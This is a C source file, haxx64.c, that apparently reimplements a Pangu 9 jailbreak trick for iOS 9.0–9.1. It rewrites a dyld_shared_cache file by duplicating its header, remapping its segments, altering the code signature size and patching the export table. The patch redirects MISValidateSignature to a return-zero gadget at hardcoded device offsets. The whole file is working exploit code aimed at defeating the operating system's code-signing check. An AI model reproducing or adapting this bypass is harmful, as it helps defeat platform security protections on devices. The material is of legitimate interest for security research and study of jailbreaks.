/* haxx64.c - 64bit dyld_shared_cache hack
 * This is used in pangu 9 (9.0-9.1), and "fix in 9.2"
 * copyright (c) 2022/01/11 dora2ios
 * license : Anyone but do not abuse.
 *
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <stddef.h>


int open_file(char *file, size_t *sz, void **buf){
    FILE *fd = fopen(file, "r");
    if (!fd) {
        printf("error opening %s\n", file);
        return -1;
    }
    
    fseek(fd, 0, SEEK_END);
    *sz = ftell(fd);
    fseek(fd, 0, SEEK_SET);
    
    *buf = malloc(*sz);
    if (!*buf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }
    
    fread(*buf, *sz, 1, fd);
    fclose(fd);
    
    return 0;
}


struct dyld_cache_header
{
    char        magic[16];              // e.g. "dyld_v0    i386"
    uint32_t    mappingOffset;          // file offset to first dyld_cache_mapping_info
    uint32_t    mappingCount;           // number of dyld_cache_mapping_info entries
    uint32_t    imagesOffset;           // file offset to first dyld_cache_image_info
    uint32_t    imagesCount;            // number of dyld_cache_image_info entries
    uint64_t    dyldBaseAddress;        // base address of dyld when cache was built
    uint64_t    codeSignatureOffset;    // file offset of code signature blob
    uint64_t    codeSignatureSize;      // size of code signature blob (zero means to end of file)
    uint64_t    slideInfoOffset;        // file offset of kernel slid info
    uint64_t    slideInfoSize;          // size of kernel slid info
    uint64_t    localSymbolsOffset;     // file offset of where local symbols are stored
    uint64_t    localSymbolsSize;       // size of local symbols information
    uint8_t     uuid[16];               // unique value for each shared cache file
};

struct dyld_cache_mapping_info {
    uint64_t    address;
    uint64_t    size;
    uint64_t    fileOffset;
    uint32_t    maxProt;
    uint32_t    initProt;
};

struct dyld_cache_image_info
{
    uint64_t    address;
    uint64_t    modTime;
    uint64_t    inode;
    uint32_t    pathFileOffset;
    uint32_t    pad;
};

// n71m 9.0.2
uint64_t exportTableOffset      = 0x1D6B25A2;
uint64_t MISValidateSignature   = 0x1975d0ec0;
uint64_t MOV_R0_0__BX_LR        = 0x1975cec18;
int isIOS9=1;
// no idea
//#include "offset.h"

int main(int argc, char **argv){
    
    if(argc != 3){
        printf("%s <in> <out>\n", argv[0]);
        return 0;
    }
    
    char *infile = argv[1];
    char *outfile = argv[2];
    
    
    void* buf;
    size_t sz;
    open_file(infile, &sz, &buf);
    
    //offset_init();
    
    struct dyld_cache_header *header = buf;
    
    printf("magic               : %s\n", header->magic);
    printf("mappingOffset       : %08x\n", header->mappingOffset);
    printf("mappingCount        : %u\n", header->mappingCount);
    printf("imagesOffset        : %08x\n", header->imagesOffset);
    printf("imagesCount         : %u\n", header->imagesCount);
    printf("dyldBaseAddress     : %016llx\n", header->dyldBaseAddress);
    printf("codeSignatureOffset : %016llx\n", header->codeSignatureOffset);
    printf("codeSignatureSize   : %016llx\n", header->codeSignatureSize);
    //printf("slideInfoOffset     : %016llx\n", header->slideInfoOffset);
    //printf("slideInfoSize       : %016llx\n", header->slideInfoSize);
    //printf("localSymbolsOffset  : %016llx\n", header->localSymbolsOffset);
    //printf("localSymbolsSize    : %016llx\n", header->localSymbolsSize);
    printf("\n");
    
    struct dyld_cache_mapping_info *mapInfo = buf + header->mappingOffset;
    for (int i=0; i < header->mappingCount; i++) {
        printf("dyld_cache_mapping_info [%i]\n", i);
        printf("address    : %016llx\n",  mapInfo->address);
        printf("size       : %016llx\n",  mapInfo->size);
        printf("fileOffset : %016llx\n",  mapInfo->fileOffset);
        printf("maxProt    : %08x\n",  mapInfo->maxProt);
        printf("initProt   : %08x\n",  mapInfo->initProt);
        mapInfo++;
        printf("\n");
    }
    mapInfo = buf + header->mappingOffset;
    
    
    // search str: "/System/Library/Caches/com.apple.xpc/sdk.dylib"
    const char* searchStr8 = "/System/Library/Caches/com.apple.xpc/sdk.dylib";
    const char* searchStr9 = "/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGCorePDF.dylib";
    
    uint64_t pathOffset;
    if(isIOS9){
        pathOffset = (uint64_t)memmem(buf, sz, searchStr9, strlen(searchStr9));
    } else {
        pathOffset = (uint64_t)memmem(buf, sz, searchStr8, strlen(searchStr8));
    }
    pathOffset -= (uint64_t)buf;
    
    int pathCount;
    struct dyld_cache_image_info *imageInfo = buf + header->imagesOffset;
    for (int i=0; i < header->imagesCount; i++) {
        //printf("dyld_cache_image_info [%i]\n", i);
        //printf("address        : %016llx\n", imageInfo->address);
        //printf("modTime        : %016llx\n", imageInfo->modTime);
        //printf("inode          : %016llx\n", imageInfo->inode);
        //printf("pathFileOffset : %08x\n", imageInfo->pathFileOffset);
        if(imageInfo->pathFileOffset == pathOffset) pathCount = i;
        //printf("path           : %s\n", (char *)buf+imageInfo->pathFileOffset);
        imageInfo++;
        //printf("pad            : %08x\n", imageInfo->pad);
        //printf("\n");
    }
    
    if(isIOS9){
        printf("path name  : %s\n", searchStr9);
    } else {
        printf("path name  : %s\n", searchStr8);
    }
    printf("pathOffset : %016llx\n", pathOffset);
    printf("pathCount  : %d\n", pathCount);
    
    imageInfo = buf + header->imagesOffset;
    printf("\n");
    
    // 16k?
    uint64_t pad = 0x4000;
    uint64_t dataSize = 0x4000;
    
    uint64_t baseAddr = mapInfo->address;
    uint64_t imageInfo_baseAddr = imageInfo->address;
    uint64_t headerSize = imageInfo_baseAddr - baseAddr;
    size_t newSize = (sz&~0xfff) + pad + headerSize + dataSize;
    
    printf("baseAddr       : %016llx\n", mapInfo->address);
    printf("imageInfo_base : %016llx\n", imageInfo_baseAddr);
    printf("headerSize     : %016llx\n", headerSize);
    printf("size           : %zx -> %zx\n", sz, newSize);
    printf("\n");
    
    
    // create newBuf
    void *newBuf = malloc(newSize);
    bzero(newBuf, newSize);
    memcpy(newBuf, buf, sz);
    
    /* copy fakeheader */
    uint64_t newHeaderOffset = ((sz&~0x3fff)+pad);
    printf("[memcpy] header [sz: %016llx] : %016llx -> %016llx\n", headerSize, (uint64_t)0, newHeaderOffset);
    memcpy(newBuf+newHeaderOffset, buf, headerSize);
    
    /* copy fakedata */
    uint64_t dataOffset = (exportTableOffset&~0x3fff);
    uint64_t newDataOffset = ((sz&~0xfff)+pad+headerSize);
    printf("[memcpy] data   [sz: %016llx] : %016llx -> %016llx\n", dataSize, dataOffset, newDataOffset);
    memcpy(newBuf+newDataOffset, buf+dataOffset, dataSize);
    printf("\n");
    
    
    /* header haxx */
    
    // 1, mappingCount += 3
    uint32_t newCount = header->mappingCount + 3;
    printf("[RemapHeader1] newCount: %08x -> %08x\n", header->mappingCount, newCount);
    *(uint32_t*)(newBuf+offsetof(struct dyld_cache_header, mappingCount)) = newCount;
    printf("\n");
    
    // 2, imagesOffset = imagesOffset + 3*sizeof(struct dyld_cache_mapping_info)
    uint32_t newImgOffset  = header->imagesOffset + 3*sizeof(struct dyld_cache_mapping_info);
    printf("[RemapHeader2] newImgOffset: %08x -> %08x\n", header->imagesOffset, newImgOffset);
    *(uint32_t*)(newBuf+offsetof(struct dyld_cache_header, imagesOffset)) = newImgOffset;
    printf("\n");
    
    // 3, remap header
    
    // flags
#define F_R (1)
#define F_W (2)
#define F_X (4)
    
    uint64_t nextBase;
    uint64_t nextSize;
    uint64_t nextOffset;
    uint64_t tableBaseSize;
    
    // dyld_cache_mapping_info[i]
    for(int i=0;i<newCount;i++){
        printf("[RemapHeader3] dyld_cache_mapping_info [%i]\n", i);
        
        
        if(i==0){
            nextBase = mapInfo->address + headerSize;
            nextSize = mapInfo->size - headerSize;
            nextOffset = headerSize;
            
            printf("address    : %016llx\n", mapInfo->address);
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, headerSize);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = headerSize;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, newHeaderOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = newHeaderOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt,  (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
        }
        
        if(i==1){
            printf("address    : %016llx -> %016llx\n",  mapInfo->address, nextBase);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, nextSize);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = nextSize;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, nextOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = nextOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
            
        }
        
        if(i==2){
            printf("address    : %016llx -> %016llx\n",  mapInfo->address, (mapInfo-1)->address);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = (mapInfo-1)->address;
            
            printf("size       : %016llx -> %016llx\n",  mapInfo->size, (mapInfo-1)->size);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = (mapInfo-1)->size;
            
            printf("fileOffset : %016llx -> %016llx\n",  mapInfo->fileOffset, (mapInfo-1)->fileOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-1)->fileOffset;
            
            printf("maxProt    : %08x -> %08x\n",  mapInfo->maxProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x -> %08x\n",  mapInfo->initProt, (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
        }
        
        if(i==3){
            nextBase = (mapInfo-1)->address + dataOffset-(mapInfo-1)->fileOffset;
            nextSize = dataOffset-(mapInfo-1)->fileOffset;
            printf("address    : %016llx\n", (mapInfo-1)->address);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = (mapInfo-1)->address;
            
            printf("size       : %016llx\n", dataOffset-(mapInfo-1)->fileOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = dataOffset-(mapInfo-1)->fileOffset;
            tableBaseSize = dataOffset-(mapInfo-1)->fileOffset;
            
            printf("fileOffset : %016llx\n", (mapInfo-1)->fileOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-1)->fileOffset;
            
            printf("maxProt    : %08x\n", (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (mapInfo-1)->maxProt;
            
            printf("initProt   : %08x\n", (mapInfo-1)->maxProt);
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (mapInfo-1)->maxProt;
        }
        
        if(i==4){
            
            printf("address    : %016llx\n", nextBase);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            nextBase = nextBase + dataSize;
            
            printf("size       : %016llx\n", dataSize);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = dataSize;
            
            printf("fileOffset : %016llx\n", newDataOffset);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = newDataOffset;
            
            printf("maxProt    : %08x\n", (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x\n", (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
        }
        
        if(i==5){
            printf("address    : %016llx\n", nextBase);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, address))
                         ) = nextBase;
            
            printf("size       : %016llx\n", (mapInfo-3)->size-dataSize-nextSize);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, size))
                         ) = (mapInfo-3)->size-dataSize-nextSize;
            
            printf("fileOffset : %016llx\n", (mapInfo-3)->fileOffset+dataSize+nextSize);
            *(uint64_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, fileOffset))
                         ) = (mapInfo-3)->fileOffset+dataSize+nextSize;
            
            printf("maxProt    : %08x\n", (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, maxProt))
                         ) = (F_R);
            
            printf("initProt   : %08x\n", (F_R));
            *(uint32_t*)(newBuf
                         + (header->mappingOffset)
                         + (i*sizeof(struct dyld_cache_mapping_info))
                         + (offsetof(struct dyld_cache_mapping_info, initProt))
                         ) = (F_R);
            
        }
        
        mapInfo++;
        printf("\n");
    }
    mapInfo = buf + header->mappingOffset;
    printf("\n");
    
    // 4, move dyld_cache_image_info
    printf("[RemapHeader4] moving dyld_cache_image_info[%016llx] %08x -> %08x\n", headerSize-newImgOffset, header->imagesOffset, newImgOffset);
    memcpy(newBuf+newImgOffset, buf+header->imagesOffset, headerSize-newImgOffset);
    printf("\n");
    
    // 5, fix dyld_cache_image_info
    uint32_t addSize = newImgOffset-header->imagesOffset;
    printf("dyld_cache_image_info Point: %016lx\n", header->imagesOffset+(pathCount*sizeof(struct dyld_cache_image_info)));
    for (int i=pathCount; i < header->imagesCount; i++) {
        printf("[RemapHeader5] imageInfo->pathFileOffset [%d]: %08x -> %08x\n",
               i,
               (imageInfo+i)->pathFileOffset,
               (imageInfo+i)->pathFileOffset+addSize);
        
        *(uint32_t*)(newBuf
                     + (header->imagesOffset)
                     + (i*sizeof(struct dyld_cache_image_info))
                     + (offsetof(struct dyld_cache_image_info, pathFileOffset))
                     + addSize
                     ) = (imageInfo+i)->pathFileOffset+addSize;
    }
    printf("\n");
    
    // 6, codesignature
    uint32_t cs_length = __builtin_bswap32(*(uint32_t*)(buf+header->codeSignatureOffset+4));
    printf("cs_length: %08x\n", cs_length);
    printf("codeSignatureSize: %016llx -> %016llx\n", header->codeSignatureSize, (uint64_t)cs_length);
    *(uint64_t*)(newBuf+offsetof(struct dyld_cache_header, codeSignatureSize)) = cs_length;
    printf("\n");
    
    // 7, change export table
    uint16_t origTable =  *(uint16_t*)(buf+exportTableOffset);
    //printf("origTable: %04x\n", origTable);
    
    uint64_t patch_point = (exportTableOffset
                            - ((mapInfo+2)->fileOffset + tableBaseSize)
                            + newDataOffset);
    printf("original_point : %016llx\n", exportTableOffset);
    printf("patch_point    : %016llx\n", patch_point);
    
    uint16_t newTable;
    if(MISValidateSignature > MOV_R0_0__BX_LR){
        uint64_t a = MISValidateSignature - MOV_R0_0__BX_LR;
        printf("a: %016llx\n", a);
        
        int i=0;
        while(a>0x80){
            i++;
            a-=0x80;
        }
        printf("i: %x\n", i);
        
        newTable = origTable - a - i*0x100;
    } else {
        uint64_t a = MOV_R0_0__BX_LR - MISValidateSignature;
        printf("a: %016llx\n", a);
        
        int i=0;
        while(a>0x80){
            i++;
            a-=0x80;
        }
        printf("i: %x\n", i);
        
        newTable = origTable + a + i*0x100;
    }
    printf("%016llx: %04x -> %04x\n", patch_point, __builtin_bswap16(origTable), __builtin_bswap16(newTable));
    
    *(uint16_t*)(newBuf+patch_point) = newTable;
    printf("\n");
    /* end */
    
    
    printf("write: %s\n", outfile);
    FILE *out = fopen(outfile, "w");
    if (!out) {
        printf("error opening %s\n", outfile);
        return -1;
    }
    
    fwrite(newBuf, newSize, 1, out);
    fflush(out);
    fclose(out);
    
    free(buf);
    
    return 0;
}
